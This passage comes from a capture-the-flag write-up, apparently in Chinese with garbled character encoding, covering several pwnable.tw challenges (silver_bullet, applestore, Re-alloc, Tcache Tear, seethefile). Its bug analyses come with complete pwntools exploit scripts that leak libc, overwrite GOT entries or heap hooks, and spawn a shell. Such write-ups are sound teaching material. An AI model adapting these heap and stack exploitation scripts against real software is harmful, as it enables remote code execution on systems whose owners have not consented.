:\");\n  read_input(&s, 0x30 - *((_DWORD *)dest + 12));      //é™åˆ¶è¾“å…¥é•¿åº¦\n  strncat(dest, &s, 0x30 - *((_DWORD *)dest + 12));   \n  v3 = strlen(&s) + *((_DWORD *)dest + 12);\n  printf(\"Your new power is : %u\\n\", v3);\n  *((_DWORD *)dest + 12) = v3;                         //æ¼æ´ç‚¹\n  return puts(\"Enjoy it !\");\n}\n```\n\nçœ‹æ ·å­ç¨‹åºä¼šå¾ˆä¸¥æ ¼çš„é™åˆ¶ä½ çš„è¾“å…¥é•¿åº¦ï¼Œä¸ä¼šè®©ä½ çš„è¾“å…¥è¶…å‡ºç¼“å†²åŒºï¼Œ\n\nä½†æ˜¯æœ‰ä¸ªè‡´å‘½é”™è¯¯åœ¨äºv3(å­˜æ”¾å­—èŠ‚é•¿åº¦çš„å˜é‡)ä¹Ÿä¼šéšä¹‹æ›´æ–°ï¼Œå¹¶ä¸”æ²¡æœ‰é™åˆ¶power upçš„ä½¿ç”¨æ¬¡æ•°\n\næ‰€ä»¥æ¯”æ–¹è¯´ï¼Œæˆ‘ä»¬å…ˆç”³è¯·äº†40ä¸ªå­—ï¼Œç„¶åpower upäº†8ä¸ªï¼Œé‚£ä¹ˆç°åœ¨çš„æ–°é•¿åº¦å°±è¢«æ›´æ–°åˆ°8\n\næ ¹æ®ä¸Šé¢çš„ç¨‹åºå¯çŸ¥ï¼Œæˆ‘ä»¬åˆæœ‰äº†0x30 - 8çš„è¾“å…¥ç©ºé—´ï¼Œå°±å¯ä»¥é€ æˆæ ˆæº¢å‡ºäº†\n\nç¬¬ä¸€æ¬¡æº¢å‡ºç”¨ROPæ³„éœ²libc\n\nç¬¬äºŒæ¬¡è¦†ç›–è¿”å›åœ°å€ä½systemå³å¯\n\n### exp\n\n```python\nfrom pwn import *\nelf = ELF('./silver_bullet')\n# libc = ELF('/lib/i386-linux-gnu/libc.so.6')\nlibc = ELF('libc_32.so.6')\n# p = elf.process()\np = remote('chall.pwnable.tw', 10103)\n# context.log_level = 'debug'\nputs_plt = elf.plt['puts']\nputs_got = elf.got['puts']\n\ndef add(con):\n    p.sendlineafter(\"Your choice :\",'1')\n    p.sendlineafter(\"Give me your description of bullet :\",str(con))\n\ndef edit(con):\n    p.sendlineafter(\"Your choice :\",'2')\n    p.sendlineafter(\"Give me your another description of bullet :\",str(con))\n\ndef beat():\n    p.sendlineafter(\"Your choice :\",'3')\n\ndef quit0():\n    p.sendlineafter(\"Your choice :\",'4')\n\nadd('a'*46)\nedit('b'*2)\nedit('\\xff'*7 + p32(puts_plt)+p32(0x8048954)+p32(puts_got))\n\nbeat()\np.recvuntil('You win !!\\n')\nlibc_base = u32(p.recv(4)) - libc.sym['puts']\ninfo(hex(libc_base))\nlibc.address = libc_base\n\nsystem = libc.sym['system']\nstr_sh = libc.search('/bin/sh').next()\ninfo(hex(system))\nadd('a'*46)\nedit('b'*2)\nedit('\\xff'*7 + p32(system)+p32(0x8048954)+p32(str_sh) )\nbeat()\np.interactive()\n```\n\n## 0x08 applestore\n\nä¸€é“é¢˜æƒ³äº†æ•´æ•´ä¸€å¤©ï¼Œåªèƒ½è¯´æ€è·¯çœŸçš„å¾ˆæ–°å¥‡ï¼Œåˆ©ç”¨æ–¹æ³•å¾ˆå·§å¦™\n\nä¸€ä¸ª32ä½ç¨‹åºï¼Œä¹°iponeç„¶ååŠ å…¥è´­ç‰©è½¦ï¼Œè¿˜æœ‰è®¡ç®—è´¦å•å’Œç»“è´¦çš„åŠŸèƒ½\n\nä½†æ˜¯åœ¨IDAä¸­çš„ç¨‹åºå¾ˆå¥‡æ€ªï¼Œä¸å¤ªå¥½åˆ†æï¼Œç»è¿‡ä¸€é¡¿åŠ¨è°ƒä¹‹åæ‰å‘ç°ï¼Œæ˜¯ä¸€ä¸ªåŒå‘é“¾è¡¨ç»“æ„ç®¡ç†çš„\n\nç„¶åå°±å¼€å§‹ä¸€æ®µæ¼«é•¿çš„æ”¹ç¨‹åºä¹‹æ—…ï¼Œä¿®æ”¹åçš„ç»“æ„ä½“å¦‚ä¸‹ï¼š\n\n```c\n00000000 phone           struc ; (sizeof=0x10, mappedto_5)\n00000000 name            dd ?\n00000004 price           dd ?\n00000008 bk              dd ?\n0000000C fd              dd ?\n00000010 phone           ends\n```\n\nä¿®æ”¹ä»£ç ä¹‹åå¯è¯»æ€§å¥½äº†å¾ˆå¤š\n\næ’å…¥å‡½æ•°ï¼š\n\n```c\nphone *__cdecl insert(phone *a1)\n{\n  phone *result; // eax\n  phone *i; // [esp+Ch] [ebp-4h]\n\n  for ( i = (phone *)&myCart; i->bk; i = (phone *)i->bk )\n    ;\n  i->bk = (int)a1;\n  result = a1;\n  a1->fd = (int)i;\n  return result;\n}\n```\n\nå¾ˆæ˜æ˜¾å®ƒä¼šä¸€ç›´éå†ï¼Œå°†æ–°èŠ‚ç‚¹åŠ å…¥é“¾è¡¨çš„æœ«å°¾\n\nå†çœ‹ä¸€ä¸‹åˆ é™¤å‡½æ•°ï¼š\n\n```c\nunsigned int delete()\n{\n  signed int v1; // [esp+10h] [ebp-38h]\n  phone *v2; // [esp+14h] [ebp-34h]\n  int idx; // [esp+18h] [ebp-30h]\n  phone *BK; // [esp+1Ch] [ebp-2Ch]\n  phone *FD; // [esp+20h] [ebp-28h]\n  char nptr; // [esp+26h] [ebp-22h]\n  unsigned int v7; // [esp+3Ch] [ebp-Ch]\n\n  v7 = __readgsdword(0x14u);\n  v1 = 1;\n  v2 = (phone *)dword_804B070;\n  printf(\"Item Number> \");\n  fflush(stdout);\n  my_read(&nptr, 0x15u);\n  idx = atoi(&nptr);\n  while ( v2 )\n  {\n    if ( v1 == idx )\n    {\n      BK = (phone *)v2->bk;\n      FD = (phone *)v2->fd;\n      if ( FD )\n        FD->bk = (int)BK;\n      if ( BK )\n        BK->fd = (int)FD;\n      printf(\"Remove %d:%s from your shopping cart.\\n\", v1, v2->name);\n      return __readgsdword(0x14u) ^ v7;\n    }\n    ++v1;\n    v2 = (phone *)v2->bk;\n  }\n  return __readgsdword(0x14u) ^ v7;\n}\n```\n\nè¿™é‡Œçš„é€»è¾‘å°±æ˜¯å¸¸è§„çš„åŒå‘é“¾è¡¨åˆ é™¤èŠ‚ç‚¹çš„æ“ä½œï¼Œå¯ä»¥è€ƒè™‘è¿›è¡Œç±»ä¼¼unlinkçš„åˆ©ç”¨\n\nå†çœ‹ä¸€ä¸‹cartå‡½æ•°\n\n```c\nint cart()\n{\n  signed int v0; // eax\n  signed int v2; // [esp+18h] [ebp-30h]\n  int total_price; // [esp+1Ch] [ebp-2Ch]\n  phone *i; // [esp+20h] [ebp-28h]\n  char buf; // [esp+26h] [ebp-22h]\n  unsigned int v6; // [esp+3Ch] [ebp-Ch]\n\n  v6 = __readgsdword(0x14u);\n  v2 = 1;\n  total_price = 0;\n  printf(\"Let me check your cart. ok? (y/n) > \");\n  fflush(stdout);\n  my_read(&buf, 0x15u);\n  if ( buf == 'y' )\n  {\n    puts(\"==== Cart ====\");\n    for ( i = (phone *)dword_804B070; i; i = (phone *)i->bk )\n    {\n      v0 = v2++;\n      printf(\"%d: %s - $%d\\n\", v0, i->name, i->price);\n      total_price += i->price;\n    }\n  }\n  return total_price;\n}\n```\n\nåŠŸèƒ½æ˜¯å°†é“¾è¡¨ä¸Šçš„iphoneåå­—å’Œä»·æ ¼æ‰“å°å‡ºæ¥ï¼Œå¹¶è¿”å›æ€»ä»·æ ¼\n\nå…³é”®ç‚¹åœ¨äºcheckoutçš„å‡½æ•°\n\n```c\nunsigned int checkout()\n{\n  int v1; // [esp+10h] [ebp-28h]\n  char *v2; // [esp+18h] [ebp-20h]\n  int v3; // [esp+1Ch] [ebp-1Ch]\n  unsigned int v4; // [esp+2Ch] [ebp-Ch]\n\n  v4 = __readgsdword(0x14u);\n  v1 = cart();\n  if ( v1 == 7174 )\n  {\n    puts(\"*: iPhone 8 - $1\");\n    asprintf(&v2, \"%s\", \"iPhone 8\");\n    v3 = 1;\n    insert((phone *)&v2);\n    v1 = 7175;\n  }\n  printf(\"Total: $%d\\n\", v1);\n  puts(\"Want to checkout? Maybe next time!\");\n  return __readgsdword(0x14u) ^ v4;\n}\n```\n\næœ‰ä¸€ä¸ªå½©è›‹ï¼Œå¦‚æœè´­ä¹°çš„iphoneæ€»ä»·æ ¼æ˜¯7174å…ƒï¼Œé‚£ä¹ˆå°±ä¼šå°†iphone8åŠ å…¥åˆ°é“¾è¡¨æœ«å°¾(1å—é’±å°±èƒ½ä¹°åˆ°iphone8ï¼)\n\n> è¿™é‡Œæœ‰ä¸ªçŸ¥è¯†ç‚¹æ˜¯asprintfå‡½æ•°ï¼Œè¿™æ˜¯ä¸€ä¸ªå¢å¼ºç‰ˆçš„sprintfå‡½æ•°ï¼Œä¸ºäº†é¿å…ç¼“å†²åŒºæº¢å‡ºï¼Œå®ƒå¯ä»¥åŠ¨æ€åˆ†é…å†…å­˜ç©ºé—´ï¼Œç›¸å½“äºmalloc()\n\nè¿™é‡Œä¼šå°†æŠŠv2æ·»åŠ åˆ°é“¾è¡¨æœ«å°¾ï¼Œé‡ç‚¹æ˜¯v2è¿˜æ˜¯ä¸€ä¸ªæ ˆåœ°å€ï¼Œé‚£ä¹ˆæˆ‘ä»¬èƒ½å¤Ÿæ§åˆ¶å®ƒå—ï¼Ÿ\n\nç­”æ¡ˆæ˜¯å¯ä»¥çš„ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°cartå‡½æ•°çš„æ ˆå¸§å’Œcheckoutå‡½æ•°åŸºæœ¬ä¸€æ ·ï¼Œcartå‡½æ•°çš„read()æ­£å¥½å¯ä»¥ä¿®æ”¹åˆ°è¿™ä¸ªä½ç½®ï¼Œå¦‚æœæˆ‘ä»¬å°†v2æ”¹æˆæŸä¸ªå‡½æ•°çš„gotè¡¨ï¼Œé‚£ä¹ˆé€šè¿‡cartå‡½æ•°å°±å¯ä»¥æ³„éœ²å‡ºlibcåŸºå€\n\næ‰€ä»¥æ€è·¯æœ‰äº†ï¼Œä¸‹ä¸€æ­¥å°±æ˜¯è¦åšåˆ°æ­£ç¡®è§¦å‘å½©è›‹ï¼Œå¾ˆç®€å•å†™ä¸ªè„šæœ¬çˆ†ç ´ä¸€ä¸‹\n\n```python\nfor i in range(36):\n    for j in range(23):\n        for k in range(14):\n            for m in range(17):\n                for n in range(36):\n                    if(199*i+299*j+499*k+399*m+199*n == 7174):\n                        print \"1:\"+str(i)+\" \"+\"2:\"+str(j)+\" \"+\"3:\"+str(k)+\" \"+\"4:\"+str(m)+\" \"+\"5:\"+str(n)\n\n                        \n#1:6 2:20 3:0 4:0 5:0\n```\n\næ‰€ä»¥åªè¦ä¹°6ä¸ª(1)å’Œ20ä¸ª(2)å°±æ­£å¥½æ˜¯7174å…ƒ\n\nç°åœ¨libcåŸºå€æœ‰äº†ï¼Œå°±è¯¥è€ƒè™‘å¦‚ä½•åˆ©ç”¨äº†\n\n**æ•´é“é¢˜çš„æ ¸å¿ƒå°±æ˜¯æ§åˆ¶ebp**\n\nåˆ©ç”¨çš„å°±æ˜¯deleteå‡½æ•°\n\n![image-20201217154252205](https://i.loli.net/2020/12/17/HVaGcMygwkFnmTq.png)\n\nå¦‚æœæˆ‘ä»¬èƒ½å°†æ ˆè¿ç§»åˆ°atoiçš„gotè¡¨å¤„ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥å¯¹gotè¡¨è¿›è¡Œæ”¹å†™\n\næ‰€ä»¥æˆ‘ä»¬è¿˜éœ€è¦æƒ³åŠæ³•æ³„éœ²æ ˆçš„åœ°å€\n\nåœ¨libcä¸­ä¿å­˜äº†ä¸€ä¸ªå‡½æ•°å«_environï¼Œå­˜çš„æ˜¯å½“å‰è¿›ç¨‹çš„ç¯å¢ƒå˜é‡\n\né€šè¿‡\\_environçš„åœ°å€å¾—åˆ°\\_environçš„å€¼ï¼Œä»è€Œå¾—åˆ°ç¯å¢ƒå˜é‡åœ°å€ï¼Œç¯å¢ƒå˜é‡ä¿å­˜åœ¨æ ˆä¸­ï¼Œæ‰€ä»¥é€šè¿‡æ ˆå†…çš„åç§»é‡ï¼Œå¯ä»¥è®¿é—®æ ˆä¸­ä»»æ„å˜é‡\n\nåˆ©ç”¨å’Œä¹‹å‰ç›¸åŒçš„æ–¹æ³•ï¼ŒæŠŠæ ˆåœ°å€æ³„éœ²å‡ºæ¥ å¯å¾—åç§»ä¸º0x104\n\nç„¶åæ„é€ payloadå¯ä»¥ä¿®æ”¹æœ€åä¸€ä¸ªèŠ‚ç‚¹çš„ç»“æ„ä½“\n\n`payload = '27' + p32(0) + p32(0)+p32(got_atoi + 0x22) + p32(stack - 0x8)`\n\né€šè¿‡`FD->bk = (int)BK`å°±å¯ä»¥å°†ebpä¿®æ”¹ä¸ºgot_atoi + 0x22ï¼Œä¸ºä»€ä¹ˆè¦åŠ 0x22å‘¢\n\nå› ä¸ºhandleå‡½æ•°é‡Œreadçš„bufåœ°å€ä¸º[ebp-0x22]ï¼Œæ‰€ä»¥è¿™æ ·æˆ‘ä»¬å°±å¯ä»¥ä¿®æ”¹atoiçš„gotè¡¨äº†\n\næœ€åçš„æœ€åï¼Œè¿˜è¦æ³¨æ„ï¼Œåœ¨å‘ç”Ÿäº†readä¹‹åæ‰ä¼šè¿›å…¥atoiï¼Œæ‰€ä»¥æˆ‘ä»¬è¾“å…¥çš„system_addrçš„åœ°å€ä¹Ÿä¼šå°±è¿›å…¥åˆ°systemå‡½æ•°ä¸­ã€‚ä¸è¿‡æœ‰äº†hacknoteçš„æ•™è®­ï¼Œæˆ‘ä»¬çŸ¥é“ï¼Œåªéœ€è¦åŠ å…¥ä¸€ä¸ª`;`æˆ–è€…`||`å°±èƒ½å¤Ÿæˆªæ–­ä¹‹å‰çš„å­—ç¬¦ä¸²ï¼Œäºæ˜¯æˆ‘ä»¬å¯ä»¥å‘é€: `p32(system_addr)+\";/bin/sh\"`\n\nç»¼ä¸Šï¼Œå°±å¯ä»¥å®Œæˆè¿™æ¬¡æ”»å‡»\n\n### exp\n\n```python\nfrom pwn import *\n# context(arch='i386', os='linux', log_level='debug')\nelf = ELF(\"./applestore\")\nlibc = ELF(\"libc_32.so.6\")\n# libc = ELF(\"/lib/i386-linux-gnu/libc.so.6\")\n# p = elf.process()\np = remote('chall.pwnable.tw', 10104)\n\ndef add(idx):\n\tp.sendlineafter(\"> \", str(2))\n\tp.sendlineafter(\"Device Number> \", str(idx))\n\ndef delete(idx):\n\tp.sendlineafter(\"> \", str(3))\n\tp.sendlineafter(\"Item Number> \", idx)\n\ndef cart(con):\n\tp.sendlineafter(\"> \", str(4))\n\tp.sendlineafter(\"Let me check your cart. ok? (y/n) > \", con)\n\ndef checkout(con):\n\tp.sendlineafter(\"> \", str(5))\n\tp.sendlineafter(\"Let me check your cart. ok? (y/n) > \", con)\n\natoi_got = elf.got['atoi']\ninfo(\"atoi_got:\" + hex(atoi_got))\n\nfor i in range(6):\n\tadd(1)\n\nfor i in range(20):\n\tadd(2)\ncheckout('y')\n\npayload = 'y\\x00' + p32(atoi_got) + p32(0) + p32(0)\ncart(payload)\n\np.recvuntil(\"27: \")\nlibc_base = u32(p.recv(4)) - libc.symbols['atoi']\nlibc.address = libc_base\nsystem = libc.symbols['system']\nenviron = libc.symbols['environ']\ninfo(\"environ:\" + hex(environ))\ninfo(\"libc_base:\" + hex(libc_base))\ninfo(\"system:\" + hex(system))\n\npayload = 'y\\x00' + p32(environ) + p32(0) + p32(0)\ncart(payload)\np.recvuntil(\"27: \")\nebp = u32(p.recv(4)) - 0x104\ninfo(\"ebp_addr:\" + hex(ebp))\n\npayload = '27' + p32(0) + p32(0) + p32(atoi_got + 0x22) + p32(ebp - 0x8)\n# gdb.attach(p)\ndelete(payload)\np.sendlineafter(\"> \", p32(system) + \";\\bin\\sh\")\n\np.interactive()\n```\n\n## 0x09 Re-alloc\n\n`I want to realloc my life :)`\n\nä¿®æ”¹ELFæ–‡ä»¶å¤´ï¼Œæ”¹å˜åŠ¨æ€åŠ è½½å™¨ã€libcä»¥åŠç¬¦å·è¡¨ä¸ºlibc2.29ç‰ˆæœ¬\n\nå…³äºreallocå‡½æ•°ï¼Œæ ¹æ®sizeçš„ä¸åŒå¯ä»¥æœ‰å¤šç§åŠŸèƒ½\n\n1. `ptr == 0`: malloc(size)\n2. `ptr != 0 && size == 0`: free(ptr)\n3. `ptr != 0 && size == old_size`: edit(ptr)\n4. `ptr != 0 && size < old_size`: edit(ptr) and free(remainder)\n5. `ptr != 0 && size > old_size`: new_ptr = malloc(size); strcpy(new_ptr, ptr); free(ptr); return new_ptr; \n\næ‰€ä»¥åˆ©ç”¨æ€è·¯æ˜¯ï¼š\n\n- åˆ©ç”¨uafåœ¨tcacheä¸åŒsizeçš„é“¾è¡¨ä¸­æ”¾ç½®ä¸€ä¸ª`atoll_got`çš„chunk\n- åˆ©ç”¨å…¶ä¸­ä¸€ä¸ªæŒ‡å‘`atoll_got`çš„chunkæ›´æ”¹`atoll_got`ä¸º`printf_plt`ï¼Œè¿™æ ·åœ¨è°ƒç”¨`atoll`æ—¶ï¼Œå°±ä¼šè°ƒç”¨`printf`ä»è€Œæ„é€ å‡ºä¸€ä¸ªæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œåˆ©ç”¨è¿™ä¸ªæ¼æ´å¯ä»¥leakå‡ºæ ˆä¸Šçš„libcåœ°å€ï¼Œè¿™é‡Œé€‰æ‹©leak`__libc_start_main`ã€‚\n- åˆ©ç”¨å¦ä¸€ä¸ªæŒ‡å‘`atoll_got`çš„chunkå°†`atoll_got`å†æ”¹æˆ`system`ï¼Œæ³¨æ„å› ä¸ºæ­¤æ—¶`atoll`æ˜¯`printf`ï¼Œæ‰€ä»¥åœ¨è°ƒç”¨allocæ—¶ï¼Œéœ€è¦è¾“å…¥çš„Indexå’ŒSizeä¸æ˜¯ç›´æ¥è¾“å…¥æ•°å­—ï¼Œè€Œæ˜¯é€šè¿‡è¾“å…¥çš„stringçš„é•¿åº¦æ¥é€šè¿‡printfè¿”å›çš„å€¼é—´æ¥ä¼ ç»™Indexå’ŒSizeã€‚\n- æœ€åå†è¾“å…¥`/bin/sh\\x00`è°ƒç”¨`atoll`æ¥æ‰§è¡Œ`system(\"/bin/sh\");`getshellå³å¯ã€‚\n\n### exp\n\n```python\nfrom pwn import *\n# p = remote(\"chall.pwnable.tw\", 10106)\nelf = ELF(\"./re-alloc\")\nlibc = ELF(\"./libc-2.29.so\")\np = elf.process()\n# context.log_level = \"debug\"\n\ndef add(idx,size,data):\n\tp.sendlineafter(\"Your choice: \",str(1))\n\tp.recvuntil(\"Index:\")\n\tp.sendline(str(idx))\n\tp.recvuntil(\"Size:\")\n\tp.sendline(str(size))\n\tp.recvuntil(\"Data:\")\n\tp.send(data)\n\ndef edit(idx,size,data):\n\tp.sendlineafter(\"Your choice: \",str(2))\n\tp.recvuntil(\"Index:\")\n\tp.sendline(str(idx))\n\tp.recvuntil(\"Size:\")\n\tp.sendline(str(size))\n\tif size!=0:\n\t\tp.recvuntil(\"Data:\")\n\t\tp.send(data)\n\ndef delete(idx):\n\tp.sendlineafter(\"Your choice: \",str(3))\n\tp.recvuntil(\"Index:\")\n\tp.sendline(str(idx))\n\nadd(0,0x18,'a'*8)\nedit(0,0,'') # free\nedit(0,0x18,p64(0x404048)) # chunk0 -> atoll_got()  tcache[0x20]\nadd(1,0x18,'a'*8)\n# clear heap[0],heap[1]\nedit(0,0x38,'a'*8) # chunk0 -> 0x38  tcache[0x40]\ndelete(0)\nedit(1,0x38,'b'*0x10) \ndelete(1)\n#again\nadd(0,0x48,'a'*0x8)\nedit(0,0,'')\nedit(0,0x48,p64(0x404048))# chunk0 -> atoll_got()  tcache[0x50]\nadd(1,0x48,'a'*0x8)\nedit(0,0x58,'a'*8)# chunk0 -> 0x38  tcache[0x60]\ndelete(0)\nedit(1,0x58,'b'*0x10)\ndelete(1)\n\nadd(0,0x48,p64(0x00401070))# plt_printf\np.sendlineafter(\"Your choice: \",str(1))\np.recvuntil(\"Index:\")\np.sendline('%paaa%pbbb%p')\n# p.recv()\np.recvuntil('bbb')\nlibc.address=int(p.recv(14),16)-0x12e009\ninfo(\"libc: \"+hex(libc.address))\n\np.sendlineafter(\"Your choice: \",str(1))\np.recvuntil(\":\")\np.sendline('a'+'\\x00')# idx = 1\np.recvuntil(\":\")\np.send('%15c')# size = 15\np.recvuntil(\"Data:\")\np.send(p64(libc.sym['system']))\np.sendlineafter(\"Your choice: \",str(3))\np.recvuntil(\"Index:\")\np.sendline(\"/bin/sh\\x00\")\np.interactive()\n```\n\n## 0x0A Tcache Tear\n\næŸ¥åˆ°è¯¥é¢˜ç›®libcç‰ˆæœ¬ä¸º2.27-3ubuntu1_amd64ï¼Œè¯¥ç‰ˆæœ¬çš„tcacheæ£€æŸ¥æœºåˆ¶è¾ƒå°‘ï¼Œå¯ä»¥åˆ©ç”¨double freeè¿›è¡Œåœ°å€ä»»æ„å†™ã€‚\n\n```c\nif ( v4 <= 7 )\n{\n    free(ptr);\n    ++v4;\n}\n```\n\nfreeåæ²¡æœ‰å°†æŒ‡é’ˆæ¸…ç©ºï¼Œå­˜åœ¨UAFæ¼æ´ï¼Œåˆ©ç”¨æ–¹æ³•æ˜¯åœ¨å¯å†™çš„bssæ®µæ„é€ ä¸€ä¸ªsizeå¤§äºtcacheçš„fake chunkï¼Œç„¶åfreeï¼Œä½¿å…¶è¿›å…¥unsorted binï¼Œæ³„éœ²å‡ºlibcåŸºå€ã€‚è¿›è€Œå†æ¬¡åˆ©ç”¨ä»»æ„åœ°å€å†™ä¿®æ”¹libcä¸­å¯ç”¨çš„å‡½æ•°æŒ‡é’ˆï¼Œæœ€ç»ˆgetshellã€‚\n\nè¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œtcacheä½¿ç”¨ 64 ä¸ªå•é“¾è¡¨ç»“æ„çš„ binsï¼Œæ¯ä¸ª bins æœ€å¤šå­˜æ”¾ 7 ä¸ª chunkï¼Œ64ä½ç¨‹åºtcacheæœ€å¤§ä¸º0x408ï¼Œå› æ­¤éœ€è¦ä¼ªé€ å¤§äº0x408å¤§å°æ‰èƒ½æ”¾å…¥unsorted binï¼Œå¹¶ä¸”ä¼ªå †å—åé¢çš„æ•°æ®ä¹Ÿè¦æ»¡è¶³åŸºæœ¬çš„å †å—æ ¼å¼ï¼Œè€Œä¸”è‡³å°‘ä¸¤å—ï¼Œå› æ­¤freeæ—¶ï¼Œä¼šå¯¹å½“å‰çš„å †å—è¿›è¡Œä¸€ç³»åˆ—æ£€æŸ¥\n\n```c\n// åœ¨ _int_free å‡½æ•°ä¸­\nif (nextchunk != av->top) {\n  /* get and clear inuse bit */\n  nextinuse = inuse_bit_at_offset(nextchunk, nextsize);\n```\n\nå¯ä»¥çœ‹åˆ°freeå‡½æ•°å¯¹å½“å‰çš„å †å—çš„nextchunkä¹Ÿè¿›è¡Œäº†ç›¸åº”çš„æ£€æŸ¥ï¼Œå¹¶ä¸”è¿˜æ£€æŸ¥äº†nextchunkçš„inuseä½ï¼Œè¿™ä¸€ä½çš„ä¿¡æ¯åœ¨nextchunkçš„nextchunkä¸­ï¼Œæ‰€ä»¥åœ¨è¿™é‡Œæˆ‘ä»¬æ€»å…±è¦ä¼ªé€ ä¸‰ä¸ªå †å—ã€‚ç¬¬ä¸€ä¸ªå †å—æˆ‘ä»¬æ„é€ å¤§å°ä¸º0x500ï¼Œç¬¬äºŒä¸ªå’Œç¬¬ä¸‰ä¸ªåˆ†åˆ«æ„é€ ä¸º0x20å¤§å°çš„å †å—ï¼Œè¿™äº›å †å—çš„æ ‡è®°ä½ï¼Œå‡ä¸ºåªç½®prev_inuseä¸º1ï¼Œä½¿å¾—freeä¸å»è¿›è¡Œåˆå¹¶æ“ä½œã€‚\n\n### exp\n\n```python\n# -*- coding: utf-8 -*-\nfrom pwn import *\ncontext.terminal = [\"tmux\",\"splitw\",\"-h\"]\n# exe = context.binary = ELF('./test')\nelf=ELF('./tcacher')\nlibc = ELF('/root/tools/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc.so.6')\nexe = './tcacher' arg1 = ''; arg2 = '' \nhost = 'chall.pwnable.tw'\nport = 10207\nif args.I:\n    context.log_level='debug'\ndef local():\n    return process(argv = [exe,arg1,arg2])\ndef remote():\n    return connect(host, port)\nstart = remote if args.R else local\n\np   = lambda      : pause() \ns   = lambda x    : success(x)\nre  = lambda m    : io.recv(numb=m)\nru  = lambda x    : io.recvuntil(x)\nrl  = lambda      : io.recvline()\nsd  = lambda x    : io.send(x)\nsl  = lambda x    : io.sendline(x)\nia  = lambda      : io.interactive()\nsla = lambda a, b : io.sendlineafter(a, b)\nsa  = lambda a, b : io.sendafter(a, b)\nuu32 = lambda x   : u32(x.ljust(4,b'\\x00'))\nuu64 = lambda x   : u64(x.ljust(8,b'\\x00'))\n\n#==================================================\ndef add(size,data):\n    sla(\"Your choice :\" , '1')\n    sla(\"Size:\" , str(size))\n    sla(\"Data:\" , data)\ndef delete():\n    sla(\"Your choice :\" , '2')\ndef show():\n    sla(\"Your choice :\" , '3')\ndef exit():\n    sla(\"Your choice :\" , '4')\nname = 0x0000000000602060\n\nio = start()\nsla(\"Name:\" , p64(0) + p64(0x501))\nadd(0x50,'a'*24)\ndelete()\ndelete()\nadd(0x50,p64(name+0x500))\nadd(0x50,p64(name+0x500))\nadd(0x50,(p64(0)+p64(0x21)*2)*2)\n\nadd(0x60,'a')\ndelete()\ndelete()\nadd(0x60,p64(name+0x10))\n# add(0x60,'a')\nadd(0x60,\"ld1ng\")\nadd(0x60,\"ld1ng\")\n\ndelete()\nshow()\nru(p64(0x501))\nlibc_base = uu64(re(6))-96-0x10-libc.sym[\"__malloc_hook\"]\nfree_hook = libc_base + libc.sym[\"__free_hook\"]\nog = [0x4f2c5,0x4f322,0x10a38c]\nrce = libc_base + og[1]\ninfo(\"libc_base: \" + hex(libc_base))\ninfo(\"free_hook: \" + hex(free_hook))\ninfo(\"rce: \" + hex(rce))\n\nadd(0x70,'a')\ndelete()\ndelete()\nadd(0x70,p64(free_hook))\nadd(0x70,\"ld1ng\")\nadd(0x70,p64(rce))\nadd(0x80,\"test\")\n# gdb.attach(io)\ndelete()\n\nio.interactive()\n```\n\n## 0x0B seethefile\n\nglibc2.23 ï¼Œé¢˜ç›®å®ç°äº†æ ‡å‡†çš„open read write çš„æµç¨‹ï¼Œä½†æ˜¯é€šè¿‡é™åˆ¶æ–‡ä»¶åç¦æ­¢è¯»flagæ–‡ä»¶ï¼Œæ¼æ´ç‚¹nameå’Œfpéƒ½æ˜¯bssæ®µæ•°æ®ï¼Œä¸”ç›¸è·å¾ˆè¿‘ï¼Œåœ¨é€€å‡ºæ—¶ï¼Œè¾“å…¥nameå¯ä»¥é€ æˆæº¢å‡ºè¦†ç›–åˆ°fp\n\n![image-20221124171057860](https://files.catbox.moe/n3dih2.png)\n\n![](https://files.catbox.moe/sy9dd5.png)\n\nå»ºè®®å­¦ä¹ [raycpå¤§ä½¬åšå®¢](https://ray-cp.github.io/archivers/IO_FILE_fclose_analysis)ï¼ŒåŒ…æ‹¬freadï¼Œfopenï¼Œfwriteï¼Œfcloseçš„æºç åˆ†æã€‚\n\nè¿™é‡Œçš„åˆ©ç”¨æ–¹æ³•æ˜¯ä¼ªé€ fake FILEï¼Œä½¿å¾—fcloseæ—¶è°ƒç”¨systemã€‚\n\nlibcçš„æ³„æ¼å¾ˆç®€å•ï¼Œåˆ©ç”¨linuxçš„procä¼ªæ–‡ä»¶ç³»ç»Ÿè¯»å–`/proc/self/maps`å³å¯è·å¾—libcåŸºå€ï¼Œä¸€æ¬¡æœ€å¤šåªèƒ½è¯»å–0x18fä¸ªå­—èŠ‚ï¼Œæ‰€ä»¥å¯ä»¥readä¸¤æ¬¡ï¼Œå°†å…¶æ‰“å°å‡ºæ¥ã€‚\n\nä¸€èˆ¬æˆ‘ä»¬è¯»å–çš„æ˜¯/proc/[pid]/mapsï¼Œå¯ä»¥è·å–ä»»æ„è¿›ç¨‹çš„æ˜ å°„ä¿¡æ¯ï¼Œè¿™é‡Œæˆ‘ä»¬ä½¿ç”¨selfæ˜¯ä¸ºäº†è·å–å½“å‰è¿›ç¨‹çš„å†…å­˜æ˜ å°„å…³ç³»\n\nå½“è¯»å…¥ä¸€ä¸ªæ–‡ä»¶åï¼Œ_IO_list_allä¾¿æŒ‡å‘å½“å‰fpï¼Œfcloseä¹‹åï¼Œå°±æŒ‡å›sterrã€‚\n\n![image-20221124172951035](https://files.catbox.moe/yxjzvh.png)\n\nfcloseçš„æ ¸å¿ƒéƒ¨åˆ†ç”±_IO_new_fcloseå®Œæˆï¼Œä¸€å…±åˆ†ä¸ºä¸‰ä¸ªéƒ¨åˆ†ï¼Œä»£ç å¦‚ä¸‹ï¼š\n\n```c\nint _IO_new_fclose (_IO_FILE *fp)\n{\n  int status;\n\n  ... \n  \n  if (fp->_IO_file_flags & _IO_IS_FILEBUF)\n    _IO_un_link ((struct _IO_FILE_plus *) fp);//å°†fpä»_IO_list_allé“¾è¡¨ä¸­å–ä¸‹\n\n  ...\n  if (fp->_IO_file_flags & _IO_IS_FILEBUF)\n    status = _IO_file_close_it (fp);  //å…³é—­æ–‡ä»¶ï¼Œå¹¶é‡Šæ”¾ç¼“å†²åŒºã€‚\n  ...\n  _IO_FINISH (fp);  //ç¡®è®¤FILEç»“æ„ä½“ä»é“¾è¡¨ä¸­åˆ é™¤ä»¥åŠç¼“å†²åŒºè¢«é‡Šæ”¾\n  ...\n  if (fp != _IO_stdin && fp != 